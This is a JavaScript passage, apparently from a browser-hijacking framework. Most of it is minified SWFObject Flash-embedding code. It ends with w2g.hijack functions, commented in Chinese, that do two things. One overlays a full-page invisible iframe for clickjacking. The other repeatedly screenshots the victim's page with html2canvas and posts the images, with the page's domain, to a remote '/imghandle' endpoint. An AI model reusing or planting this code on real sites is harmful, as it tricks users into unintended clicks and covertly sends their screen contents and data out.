aa=C(r);aa.setAttribute("type",q);var Z=X.appendChild(aa);if(Z){var Y=0;(function(){if(typeof Z.GetVariable!=D){var ab=Z.GetVariable("$version");if(ab){ab=ab.split(" ")[1].split(",");M.pv=[parseInt(ab[0],10),parseInt(ab[1],10),parseInt(ab[2],10)]}}else{if(Y<10){Y++;setTimeout(arguments.callee,10);return}}X.removeChild(aa);Z=null;H()})()}else{H()}}function H(){var ag=o.length;if(ag>0){for(var af=0;af<ag;af++){var Y=o[af].id;var ab=o[af].callbackFn;var aa={success:false,id:Y};if(M.pv[0]>0){var ae=c(Y);if(ae){if(F(o[af].swfVersion)&&!(M.wk&&M.wk<312)){w(Y,true);if(ab){aa.success=true;aa.ref=z(Y);ab(aa)}}else{if(o[af].expressInstall&&A()){var ai={};ai.data=o[af].expressInstall;ai.width=ae.getAttribute("width")||"0";ai.height=ae.getAttribute("height")||"0";if(ae.getAttribute("class")){ai.styleclass=ae.getAttribute("class")}if(ae.getAttribute("align")){ai.align=ae.getAttribute("align")}var ah={};var X=ae.getElementsByTagName("param");var ac=X.length;for(var ad=0;ad<ac;ad++){if(X[ad].getAttribute("name").toLowerCase()!="movie"){ah[X[ad].getAttribute("name")]=X[ad].getAttribute("value")}}P(ai,ah,Y,ab)}else{p(ae);if(ab){ab(aa)}}}}}else{w(Y,true);if(ab){var Z=z(Y);if(Z&&typeof Z.SetVariable!=D){aa.success=true;aa.ref=Z}ab(aa)}}}}}function z(aa){var X=null;var Y=c(aa);if(Y&&Y.nodeName=="OBJECT"){if(typeof Y.SetVariable!=D){X=Y}else{var Z=Y.getElementsByTagName(r)[0];if(Z){X=Z}}}return X}function A(){return !a&&F("6.0.65")&&(M.win||M.mac)&&!(M.wk&&M.wk<312)}function P(aa,ab,X,Z){a=true;E=Z||null;B={success:false,id:X};var ae=c(X);if(ae){if(ae.nodeName=="OBJECT"){l=g(ae);Q=null}else{l=ae;Q=X}aa.id=R;if(typeof aa.width==D||(!/%$/.test(aa.width)&&parseInt(aa.width,10)<310)){aa.width="310"}if(typeof aa.height==D||(!/%$/.test(aa.height)&&parseInt(aa.height,10)<137)){aa.height="137"}j.title=j.title.slice(0,47)+" - Flash Player Installation";var ad=M.ie&&M.win?"ActiveX":"PlugIn",ac="MMredirectURL="+O.location.toString().replace(/&/g,"%26")+"&MMplayerType="+ad+"&MMdoctitle="+j.title;if(typeof ab.flashvars!=D){ab.flashvars+="&"+ac}else{ab.flashvars=ac}if(M.ie&&M.win&&ae.readyState!=4){var Y=C("div");X+="SWFObjectNew";Y.setAttribute("id",X);ae.parentNode.insertBefore(Y,ae);ae.style.display="none";(function(){if(ae.readyState==4){ae.parentNode.removeChild(ae)}else{setTimeout(arguments.callee,10)}})()}u(aa,ab,X)}}function p(Y){if(M.ie&&M.win&&Y.readyState!=4){var X=C("div");Y.parentNode.insertBefore(X,Y);X.parentNode.replaceChild(g(Y),X);Y.style.display="none";(function(){if(Y.readyState==4){Y.parentNode.removeChild(Y)}else{setTimeout(arguments.callee,10)}})()}else{Y.parentNode.replaceChild(g(Y),Y)}}function g(ab){var aa=C("div");if(M.win&&M.ie){aa.innerHTML=ab.innerHTML}else{var Y=ab.getElementsByTagName(r)[0];if(Y){var ad=Y.childNodes;if(ad){var X=ad.length;for(var Z=0;Z<X;Z++){if(!(ad[Z].nodeType==1&&ad[Z].nodeName=="PARAM")&&!(ad[Z].nodeType==8)){aa.appendChild(ad[Z].cloneNode(true))}}}}}return aa}function u(ai,ag,Y){var X,aa=c(Y);if(M.wk&&M.wk<312){return X}if(aa){if(typeof ai.id==D){ai.id=Y}if(M.ie&&M.win){var ah="";for(var ae in ai){if(ai[ae]!=Object.prototype[ae]){if(ae.toLowerCase()=="data"){ag.movie=ai[ae]}else{if(ae.toLowerCase()=="styleclass"){ah+=' class="'+ai[ae]+'"'}else{if(ae.toLowerCase()!="classid"){ah+=" "+ae+'="'+ai[ae]+'"'}}}}}var af="";for(var ad in ag){if(ag[ad]!=Object.prototype[ad]){af+='<param name="'+ad+'" value="'+ag[ad]+'" />'}}aa.outerHTML='<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"'+ah+">"+af+"</object>";N[N.length]=ai.id;X=c(ai.id)}else{var Z=C(r);Z.setAttribute("type",q);for(var ac in ai){if(ai[ac]!=Object.prototype[ac]){if(ac.toLowerCase()=="styleclass"){Z.setAttribute("class",ai[ac])}else{if(ac.toLowerCase()!="classid"){Z.setAttribute(ac,ai[ac])}}}}for(var ab in ag){if(ag[ab]!=Object.prototype[ab]&&ab.toLowerCase()!="movie"){e(Z,ab,ag[ab])}}aa.parentNode.replaceChild(Z,aa);X=Z}}return X}function e(Z,X,Y){var aa=C("param");aa.setAttribute("name",X);aa.setAttribute("value",Y);Z.appendChild(aa)}function y(Y){var X=c(Y);if(X&&X.nodeName=="OBJECT"){if(M.ie&&M.win){X.style.display="none";(function(){if(X.readyState==4){b(Y)}else{setTimeout(arguments.callee,10)}})()}else{X.parentNode.removeChild(X)}}}function b(Z){var Y=c(Z);if(Y){for(var X in Y){if(typeof Y[X]=="function"){Y[X]=null}}Y.parentNode.removeChild(Y)}}function c(Z){var X=null;try{X=j.getElementById(Z)}catch(Y){}return X}function C(X){return j.createElement(X)}function i(Z,X,Y){Z.attachEvent(X,Y);I[I.length]=[Z,X,Y]}function F(Z){var Y=M.pv,X=Z.split(".");X[0]=parseInt(X[0],10);X[1]=parseInt(X[1],10)||0;X[2]=parseInt(X[2],10)||0;return(Y[0]>X[0]||(Y[0]==X[0]&&Y[1]>X[1])||(Y[0]==X[0]&&Y[1]==X[1]&&Y[2]>=X[2]))?true:false}function v(ac,Y,ad,ab){if(M.ie&&M.mac){return}var aa=j.getElementsByTagName("head")[0];if(!aa){return}var X=(ad&&typeof ad=="string")?ad:"screen";if(ab){n=null;G=null}if(!n||G!=X){var Z=C("style");Z.setAttribute("type","text/css");Z.setAttribute("media",X);n=aa.appendChild(Z);if(M.ie&&M.win&&typeof j.styleSheets!=D&&j.styleSheets.length>0){n=j.styleSheets[j.styleSheets.length-1]}G=X}if(M.ie&&M.win){if(n&&typeof n.addRule==r){n.addRule(ac,Y)}}else{if(n&&typeof j.createTextNode!=D){n.appendChild(j.createTextNode(ac+" {"+Y+"}"))}}}function w(Z,X){if(!m){return}var Y=X?"visible":"hidden";if(J&&c(Z)){c(Z).style.visibility=Y}else{v("#"+Z,"visibility:"+Y)}}function L(Y){var Z=/[\\\"<>\.;]/;var X=Z.exec(Y)!=null;return X&&typeof encodeURIComponent!=D?encodeURIComponent(Y):Y}var d=function(){if(M.ie&&M.win){window.attachEvent("onunload",function(){var ac=I.length;for(var ab=0;ab<ac;ab++){I[ab][0].detachEvent(I[ab][1],I[ab][2])}var Z=N.length;for(var aa=0;aa<Z;aa++){y(N[aa])}for(var Y in M){M[Y]=null}M=null;for(var X in swfobject){swfobject[X]=null}swfobject=null})}}();return{registerObject:function(ab,X,aa,Z){if(M.w3&&ab&&X){var Y={};Y.id=ab;Y.swfVersion=X;Y.expressInstall=aa;Y.callbackFn=Z;o[o.length]=Y;w(ab,false)}else{if(Z){Z({success:false,id:ab})}}},getObjectById:function(X){if(M.w3){return z(X)}},embedSWF:function(ab,ah,ae,ag,Y,aa,Z,ad,af,ac){var X={success:false,id:ah};if(M.w3&&!(M.wk&&M.wk<312)&&ab&&ah&&ae&&ag&&Y){w(ah,false);K(function(){ae+="";ag+="";var aj={};if(af&&typeof af===r){for(var al in af){aj[al]=af[al]}}aj.data=ab;aj.width=ae;aj.height=ag;var am={};if(ad&&typeof ad===r){for(var ak in ad){am[ak]=ad[ak]}}if(Z&&typeof Z===r){for(var ai in Z){if(typeof am.flashvars!=D){am.flashvars+="&"+ai+"="+Z[ai]}else{am.flashvars=ai+"="+Z[ai]}}}if(F(Y)){var an=u(aj,am,ah);if(aj.id==ah){w(ah,true)}X.success=true;X.ref=an}else{if(aa&&A()){aj.data=aa;P(aj,am,ah,ac);return}else{w(ah,true)}}if(ac){ac(X)}})}else{if(ac){ac(X)}}},switchOffAutoHideShow:function(){m=false},ua:M,getFlashPlayerVersion:function(){return{major:M.pv[0],minor:M.pv[1],release:M.pv[2]}},hasFlashPlayerVersion:F,createSWF:function(Z,Y,X){if(M.w3){return u(Z,Y,X)}else{return undefined}},showExpressInstall:function(Z,aa,X,Y){if(M.w3&&A()){P(Z,aa,X,Y)}},removeSWF:function(X){if(M.w3){y(X)}},createCSS:function(aa,Z,Y,X){if(M.w3){v(aa,Z,Y,X)}},addDomLoadEvent:K,addLoadEvent:s,getQueryParamValue:function(aa){var Z=j.location.search||j.location.hash;if(Z){if(/\?/.test(Z)){Z=Z.split("?")[1]}if(aa==null){return L(Z)}var Y=Z.split("&");for(var X=0;X<Y.length;X++){if(Y[X].substring(0,Y[X].indexOf("="))==aa){return L(Y[X].substring((Y[X].indexOf("=")+1)))}}}return""},expressInstallCallback:function(){if(a){var X=c(R);if(X&&l){X.parentNode.replaceChild(l,X);if(Q){w(Q,true);if(M.ie&&M.win){l.style.display="block"}}if(E){E(B)}}a=false}}}}();



/////////////////////////////////////
//点击劫持
/////////////////////////////////////
w2g.hijack.clickhijack = function(src,id){
	var o = document.createElement("iframe");
	o.src = src;
	
	o.style.top = "0px";
	o.style.left = "0px";
	o.style.width = "100%";
	o.style.height = "100%";
	o.style.margin = "0px";
	o.style.zIndex = 1;
	o.style.position = "absolute";

	o.frameBorder = "none";
	o.scrolling = "no";
	if(id)o.id = o.name = id;
	document.getElementsByTagName("body")[0].appendChild(o);
	return o;
};

/////////////////////////////////////
// 屏幕定时截图
/////////////////////////////////////

w2g.hijack.screenshots = function(interval){
	/*屏幕截图功能,参数说明：
	interval: 间隔时间，单位秒，默认30秒
	*/
	if(document.getElementById('canvas') == null){
		w2g.inject.script("./html2canvas.min.js", "canvas");
		
	}
	id = w2g.watermark.get(w2g.watermark.name);
	screenhandler = function (){html2canvas(document.body).then(function(canvas) {
		imgdata = canvas.toDataURL('image/jpeg');
		w2g.net.postjson({url:w2g_site+"/imghandle", data:{'id':id,'domain':document.domain ,'imgdata':imgdata}});
	});};

	w2g.flag.screenhandID = setInterval(screenhandler, interval?interval*1000:30000);
	
};